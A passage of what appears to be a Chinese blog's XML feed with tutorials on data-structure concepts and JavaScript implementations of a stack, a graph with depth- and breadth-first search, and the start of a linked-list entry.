    <content><![CDATA[<h2 id="数据结构以及相关术语的概念"><a href="#数据结构以及相关术语的概念" class="headerlink" title="数据结构以及相关术语的概念"></a>数据结构以及相关术语的概念</h2><h4 id="数据"><a href="#数据" class="headerlink" title="数据"></a>数据</h4><h6 id="数据-1"><a href="#数据-1" class="headerlink" title="数据"></a>数据</h6><p>数据：所有被计算机存储、处理的对象都叫做数据。如：文字、语音、图像、视频 等等，数据的含义非常广泛。</p>
<h6 id="数据元素"><a href="#数据元素" class="headerlink" title="数据元素"></a>数据元素</h6><p><code>数据</code> 是由 <code>数据元素</code> 组成的，<code>数据元素</code> 是数据的基本单位。</p>
<h6 id="数据项"><a href="#数据项" class="headerlink" title="数据项"></a>数据项</h6><p><code>数据元素</code> 是数据的基本单位，而数据项是数据的不可分割的最小标示单位，<code>数据元素</code> 由若干个 <code>数据项组成</code></p>
<h4 id="数据结构"><a href="#数据结构" class="headerlink" title="数据结构"></a>数据结构</h4><p>数据结构描述了一个 <code>数据</code> 中 <code>数据元素</code> 间的某种关系。它包括：<code>数据的逻辑结构</code>、<code>数据的存储结构</code>、<code>数据的基本运算</code>。</p>
<p><img src="/static/img/sjjg1.png" width="311"></p>
<h6 id="数据的逻辑结构"><a href="#数据的逻辑结构" class="headerlink" title="数据的逻辑结构"></a>数据的逻辑结构</h6><p>数据的逻辑结构描述的是 <code>数据元素</code> 间的逻辑关系，比如一个数据中数据元素间可能没有任何关系，那么这种数据的数据逻辑结构叫 <code>集合</code>，如果数据元素间是一个接着一个排列的，那么这种数据的数据逻辑结构叫 <code>线性结构</code>，常见的数据逻辑结构有四大类：</p>
<ul>
<li>集合</li>
<li>线性结构</li>
<li>树形结构</li>
<li>图结构</li>
</ul>
<p>如下图所示：</p>
<p><img src="/static/img/ljjg.png" width="400"></p>
<h6 id="数据的存储结构"><a href="#数据的存储结构" class="headerlink" title="数据的存储结构"></a>数据的存储结构</h6><p>数据的逻辑结构在计算机中实现称为 <code>数据的存储结构</code>。</p>
<p>数据的存储结构由 <code>数据元素</code> 与 <code>元素间的关系</code> 组成，表示元素间的关系主要有两种方式：<code>顺序存储</code> 和 <code>链式存储</code>，如下图：</p>
<p><img src="/static/img/sjccjg.png" width="400"></p>
<ul>
<li>顺序存储：存储节点存放在一个连续的存储区域里。</li>
<li>链式存储：存储节点除了包含数据元素外，还包含一个指向其他存储节点的指针。</li>
</ul>
<h6 id="数据的基本运算"><a href="#数据的基本运算" class="headerlink" title="数据的基本运算"></a>数据的基本运算</h6><p>数据的基本运算指的是：对数据的逻辑结构施加一系列操作。</p>
<p>比如栈有如下基本操作：</p>
<ul>
<li>push(element)【压入栈】</li>
<li>pop()【弹出栈】</li>
<li>peek()【预览栈顶】</li>
<li>clear()【清空栈】</li>
<li>length()【获取栈的元素个数】</li>
</ul>
<p>队列有如下基本操作：</p>
<ul>
<li>enqueue(element)【入队】</li>
<li>dequeue()【出队】</li>
<li>peek()【读取队头的元素】</li>
<li>clear()【清空队列】</li>
<li>length()【获取队列的元素个数】</li>
</ul>
<p>类似于着一些列的操作，我们成为数据的基本运算。</p>
<p>我们知道，栈和队列拥有相同的逻辑结构，即都是线性结构，但他们并不是相同的数据结构，因为他们拥有不同的基本运算。不要忘了数据结构所代表的是数据的逻辑结构、数据的存储结构以及数据的基本操作三者共同的作用：</p>
<p><img src="/static/img/sjjg1.png" width="311"></p>
]]></content>
      <categories>
        <category>数据结构</category>
      </categories>
      <tags>
        <tag>数据结构</tag>
        <tag>概念</tag>
      </tags>
  </entry>
  <entry>
    <title>数据结构-栈</title>
    <url>/2018/04/17/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84_%E6%A0%88/</url>
    <content><![CDATA[<h2 id="栈"><a href="#栈" class="headerlink" title="栈"></a>栈</h2><h4 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h4><p>栈是一种特殊的列表，栈内的元素只能通过列表的一端访问，这一端称为栈顶，栈是一种后入先出(last-in-first-out)的数据结构。<br>对栈的操作有以下几种：</p>
<ul>
<li>1、压入栈（将一个元素压入栈顶）</li>
<li>2、弹出栈（弹出栈顶的元素）</li>
<li>3、预览栈顶（获取但不弹出栈顶的元素）</li>
<li>4、清空栈（清空栈内所有元素）</li>
<li>5、获取栈内元素的个数</li>
</ul>
<h4 id="JavaScript实现"><a href="#JavaScript实现" class="headerlink" title="JavaScript实现"></a>JavaScript实现</h4><p>我们知道，JavaScript数组原生提供了栈方法，如：<code>push</code>、<code>pop</code>、<code>unshift</code>、<code>shift</code> 等等，所以我们既可以用数组来模拟栈，又可以用数组来模拟队列，但正因为这样，数组既不能严格的作为栈使用，也不能严格的作为队列使用，所以我们有必要手动封装严格的栈的定义。</p>
<h6 id="栈的方法和属性"><a href="#栈的方法和属性" class="headerlink" title="栈的方法和属性"></a>栈的方法和属性</h6><p>根据对栈的操作定义，我们可以总结栈所拥有的属性和方法</p>
<ul>
<li>属性<ul>
<li>无</li>
<li>或者你自定义需要的属性</li>
</ul>
</li>
<li>方法<ul>
<li>push(element)</li>
<li>pop()</li>
<li>peek()</li>
<li>clear()</li>
<li>length()</li>
</ul>
</li>
</ul>
<h6 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h6><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Stack</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.store = []</span><br><span class="line">&#125;</span><br><span class="line">Stack.prototype = &#123;</span><br><span class="line">    <span class="keyword">constructor</span>: Stack,</span><br><span class="line">    push: function (element) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.store.push(element)</span><br><span class="line">    &#125;,</span><br><span class="line">    pop: <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.store.pop()</span><br><span class="line">    &#125;,</span><br><span class="line">    peek: <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.store[<span class="keyword">this</span>.length() - <span class="number">1</span>]</span><br><span class="line">    &#125;,</span><br><span class="line">    clear: <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.store.length = <span class="number">0</span></span><br><span class="line">    &#125;,</span><br><span class="line">    length: <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.store.length</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>上面的代码是一段极简的实现，栈的底层数据结构是使用的数组：<code>this.store</code>，我们可以对上面的代码进行如下测试：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> stack = <span class="keyword">new</span> Stack()</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(stack.peek())   <span class="comment">// undefined</span></span><br><span class="line"></span><br><span class="line">stack.push(<span class="number">1</span>)</span><br><span class="line">stack.push(<span class="number">2</span>)</span><br><span class="line">stack.push(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(stack.peek())   <span class="comment">// 3</span></span><br><span class="line"></span><br><span class="line">stack.pop()</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(stack.peek())   <span class="comment">// 2</span></span><br><span class="line"><span class="built_in">console</span>.log(stack.length()) <span class="comment">// 2</span></span><br><span class="line"></span><br><span class="line">stack.clear()</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(stack.length()) <span class="comment">// 0</span></span><br></pre></td></tr></table></figure>
<h4 id="栈的应用"><a href="#栈的应用" class="headerlink" title="栈的应用"></a>栈的应用</h4><h6 id="回文问题"><a href="#回文问题" class="headerlink" title="回文问题"></a>回文问题</h6><p>“回文” 简单的说就是正着读和反着读是一样的，比如 <code>abcba</code>，<code>12321</code> 等等。那么问题来了，如何确定一个字符串是不是回文呢？</p>
<p>有的同学可能已经想到了，js数组有一个方法 <code>reverse</code> ，用来反转一个数组的顺序，于是我们可以借助数组以及数组的 <code>reverse</code> 方法来判断：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> str = <span class="string">'12321'</span></span><br><span class="line"><span class="keyword">var</span> reStr = str.split(<span class="string">''</span>).reverse().join(<span class="string">''</span>)</span><br><span class="line"><span class="keyword">if</span> (str === reStr) &#123;</span><br><span class="line">    <span class="comment">// 是回文</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>那么问题来了，如果js在语言层面没有给我们提供 <code>reverse</code> 方法，需要我们手动封装怎么办呢？这，就用到了栈的知识，接下来我们手动封装 <code>reverse</code> 方法，用来对数组进行反转：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">reverse</span> (<span class="params">arr</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> stack = <span class="keyword">new</span> Stack()</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; arr.length; i++) &#123;</span><br><span class="line">        stack.push(arr[i])</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">var</span> reArr = []</span><br><span class="line">    <span class="keyword">while</span> (stack.length() &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        reArr.push(stack.pop())</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> reArr</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>然后，我们可以这样使用我们的 <code>reverse</code> 方法：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> str = <span class="string">'12321'</span></span><br><span class="line"><span class="keyword">var</span> reStr = reverse(str.split(<span class="string">''</span>)).join(<span class="string">''</span>)</span><br><span class="line"><span class="keyword">if</span> (str === reStr) &#123;</span><br><span class="line">    <span class="comment">// 是回文</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>原理其实很简单，我们把每个元素按照原来的顺序依次入栈，然后在依次将元素从栈顶弹出，那么弹出后元素的顺序应该是原来元素顺序的反转。</p>
<p>除了判断回文，数制转换也可以应用栈，判断表达式中的括号是否匹配等等，都可以应用到栈，其原理无非是利用了 <code>入栈</code> 与 <code>出栈</code> 后的顺序变化，以及栈内元素的数量来作出相应的判断。另外有些问题需要多个栈配合来解决，有兴趣的可以多在网上搜一搜用栈解决的一些问题。</p>
]]></content>
      <categories>
        <category>数据结构</category>
      </categories>
      <tags>
        <tag>数据结构</tag>
        <tag>栈</tag>
      </tags>
  </entry>
  <entry>
    <title>数据结构-图</title>
    <url>/2018/04/17/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84_%E5%9B%BE/</url>
    <content><![CDATA[<h2 id="图"><a href="#图" class="headerlink" title="图"></a>图</h2><h4 id="图的现实意义"><a href="#图的现实意义" class="headerlink" title="图的现实意义"></a>图的现实意义</h4><p>可以用图对现实中很多系统进行建模，比如：交通流量模型，航空公司的飞行系统，局域网或广域网等计算机网络，可以说图的应用场景非常多。</p>
<h4 id="一些概念"><a href="#一些概念" class="headerlink" title="一些概念"></a>一些概念</h4><h5 id="图、边、顶点"><a href="#图、边、顶点" class="headerlink" title="图、边、顶点"></a>图、边、顶点</h5><p>图由 <code>边的集合</code> 和 <code>顶点的集合</code> 组成。我们可以拿来一张中国地图，每一个省份可以看做是一个 <code>顶点</code>，临接的省份之间可以画一条线，这条线就是 <code>边</code>。</p>
<h5 id="顶点对"><a href="#顶点对" class="headerlink" title="顶点对"></a>顶点对</h5><p><code>边</code> 是由 <code>顶点对</code> 定义的，比如边 <code>l</code> 是由顶点对 <code>(p1, p2)</code> 定义的。</p>
<h5 id="有向图、顶点的流向"><a href="#有向图、顶点的流向" class="headerlink" title="有向图、顶点的流向"></a>有向图、顶点的流向</h5><p><code>顶点</code> 是有 <code>权重</code> 的，或者叫做 <code>成本</code>，可以根据 <code>权重</code> 对 <code>顶点对</code> 进行排序，如果一个图的 <code>顶点对</code> 是有序的，我们称之为 <code>有向图</code>。</p>
<p><code>有向图</code> 表明了 <code>顶点的流向</code></p>
<h5 id="无向图"><a href="#无向图" class="headerlink" title="无向图"></a>无向图</h5><p>如果图是无序的，我们称之为 <code>无序图</code></p>
<h5 id="路径、路径的长度"><a href="#路径、路径的长度" class="headerlink" title="路径、路径的长度"></a>路径、路径的长度</h5><p>从一个顶点到达另外一个顶点所经过的边组成 <code>路径</code>。</p>
<p><code>路径的长度</code> 是由边的数量定义的。</p>
<h5 id="环"><a href="#环" class="headerlink" title="环"></a>环</h5><p>指向自身的顶点构成的路径成为 <code>环</code>，<code>环</code> 的长度为 <code>0</code>。</p>
<h5 id="圈、简单圈、平凡圈"><a href="#圈、简单圈、平凡圈" class="headerlink" title="圈、简单圈、平凡圈"></a>圈、简单圈、平凡圈</h5><p><code>圈</code> 是 <code>长度 &gt;= 1</code> 的路径，且路径的第一个顶点和最后一个顶点相同。</p>
<p>除了第一个和最后一个顶点之外，没有重复的顶点或重复边的圈成为 <code>简单圈</code>，否则成为 <code>平凡圈</code>。</p>
<h5 id="顶点强连通、有向图强连通"><a href="#顶点强连通、有向图强连通" class="headerlink" title="顶点强连通、有向图强连通"></a>顶点强连通、有向图强连通</h5><p>如果两个顶点之间有 <code>路径</code>，那么 <code>这两个点就是强连通</code> 的。</p>
<p>如果 <code>有向图</code> 的所有顶点都是强连通的，那么这个 <code>有向图也是强连通</code> 的。</p>
<h4 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h4><h5 id="如何存储-表示-图？"><a href="#如何存储-表示-图？" class="headerlink" title="如何存储(表示)图？"></a>如何存储(表示)图？</h5><p>我们不妨先来看一下 <code>图</code> 和 <code>二叉树</code> 的图片示意：</p>
<h6 id="树的示意图"><a href="#树的示意图" class="headerlink" title="树的示意图"></a>树的示意图</h6><p><img src="/static/img/tree.png" width="500"></p>
<h6 id="图的示意图"><a href="#图的示意图" class="headerlink" title="图的示意图"></a>图的示意图</h6><p><img src="/static/img/graph.png" width="500"></p>
<p>我们之前讲过树的存储结构是，需要节点类表示树中的节点，每个节点除了保存自身数据外，还有用对子节点的引用，从而构造一颗树。</p>
<p>根据上面树和图的示意图，可能很多同学觉得他们很像，你可能尝试用构建树的方法去构建图，即在节点中保存相连接节点的引用，但实际上这种方法是有问题的，原因是：树是有清晰的层次结构的，而图的层次结构是很复杂的。</p>
<p>所以我们需要思考：如何存储图？</p>
<h6 id="邻接表"><a href="#邻接表" class="headerlink" title="邻接表"></a>邻接表</h6><p>一种用来存储图的方式是使用邻接表数组，首先我们需要用一个数组来存储图中所有的顶点，假设我们如下5个顶点：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">A B C D E</span><br></pre></td></tr></table></figure>
<p>我们使用一个数组来存储这5个顶点，称之为顶点数组：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> vertex = [<span class="string">'A'</span>, <span class="string">'B'</span>, <span class="string">'C'</span>, <span class="string">'D'</span>, <span class="string">'E'</span>]</span><br></pre></td></tr></table></figure>
<p>顶点 <code>A</code> 在数组中的位置是 <code>0</code>，<code>B</code> 在数组中的位置是 <code>1</code>，以此类推。</p>
<p>接下来，我们同样还需要一个数组，即我们的邻接表数组，该数组存储为由一个顶点相邻的顶点组成的数组，并以顶点在顶点数组中的位置作为索引，这样我们根据顶点在顶点数组中的索引，访问邻接表数组，就可以迅速的知道有哪些顶点与其相连：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> vertex = [<span class="string">'A'</span>, <span class="string">'B'</span>, <span class="string">'C'</span>, <span class="string">'D'</span>, <span class="string">'E'</span>]</span><br><span class="line"><span class="keyword">let</span> adj = [</span><br><span class="line">    [<span class="string">'B'</span>, <span class="string">'D'</span>],</span><br><span class="line">    [<span class="string">'A'</span>],</span><br><span class="line">    [<span class="string">'D'</span>, <span class="string">'E'</span>],</span><br><span class="line">    [<span class="string">'A'</span>, <span class="string">'C'</span>],</span><br><span class="line">    [<span class="string">'C'</span>]</span><br><span class="line">]</span><br></pre></td></tr></table></figure>
<p>如上面的代码顶点 <code>A</code> 在 <code>vertex</code> 中的索引为 <code>0</code>，我们通过访问 <code>adj[0]</code> 可以得到数组 <code>[&#39;B&#39;, &#39;D&#39;]</code>，说明顶点 <code>A</code> 与顶点 <code>B</code> 和 <code>D</code> 相连。</p>
<h6 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h6><p>实现图的过程，实际上就是构造顶点数组 <code>vertex</code> 以及 邻接表数组 <code>adj</code> 的过程。</p>
<p>首先顶点可能由很多复杂的数据构成，比如地图中的城市拥有名称、经纬度等等，所以我们需要一个顶点类，类似于二叉树中的节点类，如下：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 顶点类</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Vert</span> (<span class="params">data, visited</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// 顶点的数据</span></span><br><span class="line">    <span class="keyword">this</span>.data = data</span><br><span class="line">    <span class="comment">// 标示着顶点是否被访问过</span></span><br><span class="line">    <span class="keyword">this</span>.visited = visited</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>有了顶点类，我们就可以构造顶点数组了，为了方便，我们顶点中只保存整型数据：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> vertex = [</span><br><span class="line">    <span class="keyword">new</span> Vert(<span class="number">0</span>),</span><br><span class="line">    <span class="keyword">new</span> Vert(<span class="number">1</span>),</span><br><span class="line">    <span class="keyword">new</span> Vert(<span class="number">2</span>),</span><br><span class="line">    <span class="keyword">new</span> Vert(<span class="number">3</span>),</span><br><span class="line">    <span class="keyword">new</span> Vert(<span class="number">4</span>)</span><br><span class="line">]</span><br></pre></td></tr></table></figure>
<p>下一步就是构造邻接表数组，这个邻接表数组实际上就是图的描述，我们需要一个 <code>Graph</code> 类：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 图类，构造邻接表数组 adj，传递顶点数组 vertex 进行初始化</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Graph</span> (<span class="params">vertex</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.vertex = vertex</span><br><span class="line">    <span class="comment">// 顶点数量</span></span><br><span class="line">    <span class="keyword">this</span>.quantity = vertex.length</span><br><span class="line">    <span class="comment">// 边的数量</span></span><br><span class="line">    <span class="keyword">this</span>.edges = <span class="number">0</span></span><br><span class="line">    <span class="comment">// 邻接表数组</span></span><br><span class="line">    <span class="keyword">this</span>.adj = []</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="keyword">this</span>.quantity; i++) &#123;</span><br><span class="line">        <span class="keyword">this</span>.adj[i] = []</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>如上代码，<code>Graph</code> 类通过传递给它的顶点数组构造一个图，在初始状态，图中的顶点之间没有任何关系，所以边的数量为 0，邻接表数组被初始化为与顶点相对应的空数组。</p>
<p>接下来，我们的 <code>Graph</code> 类需要一个方法 <code>addEdge</code>：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">Graph.prototype.addEdge = <span class="function"><span class="keyword">function</span> (<span class="params">v1, v2</span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>addEdge</code> 方法接收两个顶点数据作为参数，并根据数据确定对应顶点，然后将数据值为 <code>data2</code> 的顶点 <code>v2</code> 添加到数据值为 <code>data1</code> 的顶点 <code>v1</code> 对应的邻接表数组中，即 <code>v2</code> 与 <code>v1</code> 相连，实现如下：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">Graph.prototype.addEdge = <span class="function"><span class="keyword">function</span> (<span class="params">data1, data2</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// 查找顶点 v1 在顶点数组的位置</span></span><br><span class="line">    <span class="keyword">var</span> v1Index = <span class="keyword">this</span>.searchPos(data1)</span><br><span class="line">    <span class="comment">// 查找顶点 v2 在顶点数组的位置</span></span><br><span class="line">    <span class="keyword">var</span> v2Index = <span class="keyword">this</span>.searchPos(data2)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">this</span>.adj[v1Index].push(v2Index)</span><br><span class="line">    <span class="keyword">this</span>.adj[v2Index].push(v1Index)</span><br><span class="line">    <span class="keyword">this</span>.edges++</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>上面的代码中我们使用了 <code>searchPos</code> 方法，该方法查找拥有指定数据的顶点在顶点数组中的位置，实现如下：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">Graph.prototype.searchPos = <span class="function"><span class="keyword">function</span> (<span class="params">data</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> index = <span class="number">-1</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="keyword">this</span>.quantity; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">this</span>.vertex[i].data == data) &#123;</span><br><span class="line">            index = i</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> index</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>为了方便查看，我们需要一个 <code>showGraph</code> 方法，用来查看图：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">Graph.prototype.showGraph = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> putStr = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="keyword">this</span>.quantity; i++) &#123;</span><br><span class="line">        putStr = <span class="string">''</span></span><br><span class="line">        putStr += i + <span class="string">' -&gt; '</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">var</span> j = <span class="number">0</span>; j &lt; <span class="keyword">this</span>.quantity; j++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">this</span>.adj[i][j] !== <span class="literal">undefined</span>) &#123;</span><br><span class="line">                putStr += <span class="string">' '</span> + <span class="keyword">this</span>.adj[i][j] + <span class="string">' '</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">console</span>.log(putStr)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>showGraph</code> 方法只是简单的对邻接表数组进行遍历输出。</p>
<p>现在，我们可以写一些测试代码：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 顶点数组</span></span><br><span class="line"><span class="keyword">var</span> vertex = [</span><br><span class="line">    <span class="keyword">new</span> Vert(<span class="number">0</span>),</span><br><span class="line">    <span class="keyword">new</span> Vert(<span class="number">1</span>),</span><br><span class="line">    <span class="keyword">new</span> Vert(<span class="number">2</span>),</span><br><span class="line">    <span class="keyword">new</span> Vert(<span class="number">3</span>),</span><br><span class="line">    <span class="keyword">new</span> Vert(<span class="number">4</span>)</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> g = <span class="keyword">new</span> Graph(vertex)</span><br><span class="line">g.addEdge(<span class="number">0</span>, <span class="number">1</span>)</span><br><span class="line">g.addEdge(<span class="number">0</span>, <span class="number">2</span>)</span><br><span class="line">g.addEdge(<span class="number">1</span>, <span class="number">3</span>)</span><br><span class="line">g.addEdge(<span class="number">2</span>, <span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">g.showGraph()</span><br></pre></td></tr></table></figure>
<p>打开浏览器控制台，应该看到如下输出：</p>
<p><img src="/static/img/linjiebiao.png" width="500"></p>
<h5 id="图的搜索"><a href="#图的搜索" class="headerlink" title="图的搜索"></a>图的搜索</h5><p>经常用图来解决的问题比如：从一个城市到另外一个城市的最短距离，这个问题实际上可以抽象出从图中的一个顶点到达另外一个顶点的最短路径的问题。图的这一操作叫做搜索，对图有两种基本搜索方式：<code>深度优先搜索</code>、<code>广度优先搜索</code>。</p>
<h6 id="深度优先搜索"><a href="#深度优先搜索" class="headerlink" title="深度优先搜索"></a>深度优先搜索</h6><p>深度优先搜索的思路是，从一条路径的顶点开始，直到到达最后一个顶点，然后回溯，继续追溯下一条路径。</p>
<p>具体到我们的存储结构：<code>顶点数组</code> 和 <code>邻接表数组</code>，我们找到起始顶点在 <code>顶点数组</code> 中的位置，然后找到相应位置 <code>邻接表数组</code> 中存储的相邻顶点，做递归搜索即可，代码如下：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">Graph.prototype.dfs = <span class="function"><span class="keyword">function</span> (<span class="params">data</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// 找到起始顶点在邻接表数组中的位置</span></span><br><span class="line">    <span class="keyword">var</span> index = <span class="keyword">this</span>.searchPos(data)</span><br><span class="line">    <span class="comment">// 将其设置为已访问</span></span><br><span class="line">    <span class="keyword">this</span>.vertex[index].visited = <span class="literal">true</span></span><br><span class="line">    <span class="built_in">console</span>.log(<span class="keyword">this</span>.vertex[index].data)</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 遍历邻接表数组中存储的相邻顶点，递归搜索</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="keyword">this</span>.adj[index].length; i++) &#123;</span><br><span class="line">        <span class="keyword">var</span> key = <span class="keyword">this</span>.adj[index][i]</span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">this</span>.vertex[key].visited) &#123;</span><br><span class="line">            <span class="keyword">this</span>.dfs(<span class="keyword">this</span>.vertex[key].data)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>针对上面的例子写如下测试代码：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">g.dfs(<span class="number">0</span>)</span><br></pre></td></tr></table></figure>
<p>输出如下：</p>
<p><img src="/static/img/dfs.png" width="500"></p>
<h6 id="广度优先搜索"><a href="#广度优先搜索" class="headerlink" title="广度优先搜索"></a>广度优先搜索</h6><p>深度优先搜索是纵向延伸的搜索，而广度优先搜索是横向延伸的搜索。递归可以解决深度优先所搜，而广度优先搜索需要使用一个队列，来操作，具体代码并不复杂，如下：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">Graph.prototype.bfs = <span class="function"><span class="keyword">function</span> (<span class="params">data</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// 一个队列</span></span><br><span class="line">    <span class="keyword">var</span> queue = []</span><br><span class="line">    <span class="comment">// 找到起始顶点在邻接表数组中的位置</span></span><br><span class="line">    <span class="keyword">var</span> index = <span class="keyword">this</span>.searchPos(data)</span><br><span class="line">    <span class="comment">// 将起始顶点入队</span></span><br><span class="line">    queue.push(index)</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 遍历队列的过程就是在横向搜索</span></span><br><span class="line">    <span class="keyword">while</span> (queue.length &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> i = queue.shift()</span><br><span class="line">        <span class="keyword">this</span>.vertex[i].visited = <span class="literal">true</span></span><br><span class="line">        <span class="built_in">console</span>.log(<span class="keyword">this</span>.vertex[i].data)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">var</span> j = <span class="number">0</span>; j &lt; <span class="keyword">this</span>.adj[i].length; j++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!<span class="keyword">this</span>.vertex[<span class="keyword">this</span>.adj[i][j]].visited) &#123;</span><br><span class="line">                queue.push(<span class="keyword">this</span>.adj[i][j])</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>还是针对前面的例子，写如下测试代码：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">g.bfs(<span class="number">0</span>)</span><br></pre></td></tr></table></figure>
<p>输出如下：</p>
<p><img src="/static/img/bfs.png" width="500"></p>
]]></content>
      <categories>
        <category>数据结构</category>
      </categories>
      <tags>
        <tag>数据结构</tag>
        <tag>图</tag>
      </tags>
  </entry>
  <entry>
    <title>数据结构-链表</title>
    <url>/2018/04/17/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84_%E9%93%BE%E8%A1%A8/</url>
    <content><![CDATA[<h2 id="链表"><a href="#链表" class="headerlink" title="链表"></a>链表</h2><h4 id="链表的优势"><a href="#链表的优势" class="headerlink" title="链表的优势"></a>链表的优势</h4><p>链表是一种特殊的列表，不同于数组，数组不总是组织数据的最佳数据结构，原因如下：</p>
<ul>
<li>在有些变成语言中：<ul>
<li>数组的长度是需要预先设定好的，也就是说数组的长度是固定的，想要扩展会很困难。</li>
<li>向数组中添加或删除元素也很麻烦，因为需要将数组的元素向前或向后循环位移。</li>
</ul>
</li>
<li>在JavaScript中<ul>
<li>JavaScript显然不存在上述两个数组缺点的说法，因为数组的长度是可变的，另外可以使用 <code>splice</code> 方法轻松的对数组进行添加删除的操作。</li>
